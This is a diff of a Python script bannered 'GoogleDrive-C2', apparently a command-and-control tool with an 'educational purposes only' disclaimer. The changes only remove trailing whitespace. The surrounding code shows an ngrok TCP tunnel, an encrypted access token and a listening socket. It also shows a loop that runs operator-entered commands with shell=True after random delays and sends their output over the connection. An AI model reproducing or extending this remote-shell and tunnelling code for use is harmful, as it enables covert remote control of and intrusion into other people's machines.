@@ -9,14 +9,14 @@
 # Disclaimer: it's essential to note that this script is for educational purposes only, and any unauthorized use of it could lead to legal consequences.
 
 
-print('''\033[94m 
- #####                                     ######                                #####   #####  
-#     #  ####   ####   ####  #      ###### #     # #####  # #    # ######       #     # #     # 
-#       #    # #    # #    # #      #      #     # #    # # #    # #            #             # 
-#  #### #    # #    # #      #      #####  #     # #    # # #    # #####  ##### #        #####  
-#     # #    # #    # #  ### #      #      #     # #####  # #    # #            #       #       
-#     # #    # #    # #    # #      #      #     # #   #  #  #  #  #            #     # #       
- #####   ####   ####   ####  ###### ###### ######  #    # #   ##   ######        #####  #######           
+print('''\033[94m
+ #####                                     ######                                #####   #####
+#     #  ####   ####   ####  #      ###### #     # #####  # #    # ######       #     # #     #
+#       #    # #    # #    # #      #      #     # #    # # #    # #            #             #
+#  #### #    # #    # #      #      #####  #     # #    # # #    # #####  ##### #        #####
+#     # #    # #    # #  ### #      #      #     # #####  # #    # #            #       #
+#     # #    # #    # #    # #      #      #     # #   #  #  #  #  #            #     # #
+ #####   ####   ####   ####  ###### ###### ######  #    # #   ##   ######        #####  #######
 \033[0m''')
 
 # Importing necessary libraries
@@ -69,7 +69,7 @@ def main():
         print(GREEN + "[*] Starting ngrok tunnel..." + RESET)
         # Starting ngrok tunnel
         ngrok_process = subprocess.Popen(['ngrok', 'tcp', port])
-        time.sleep(3)  
+        time.sleep(3)
 
         # Encrypting access token
         access_token_encrypted = encrypt_access_token(access_token, key_length)
@@ -86,7 +86,7 @@ def main():
 
         # Creating socket
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((ip, int(port)))  
+        s.bind((ip, int(port)))
         s.listen(1)
         print(YELLOW + "[!] Waiting for incoming connection..." + RESET)
         client_socket, addr = s.accept()
@@ -103,13 +103,13 @@ def main():
             command = input(RED + "Enter a command to execute (or type 'exit' to quit): " + RESET)
             if command.lower() == "exit":
                 break
-            
+
             time.sleep(random.uniform(1, 5))
-            
+
             result = subprocess.run(command, shell=True, capture_output=True, text=True)
             stdout = result.stdout
             stderr = result.stderr
-            
+
             client_socket.send(command.encode())
             client_socket.send(stdout.encode())
             client_socket.send(stderr.encode())
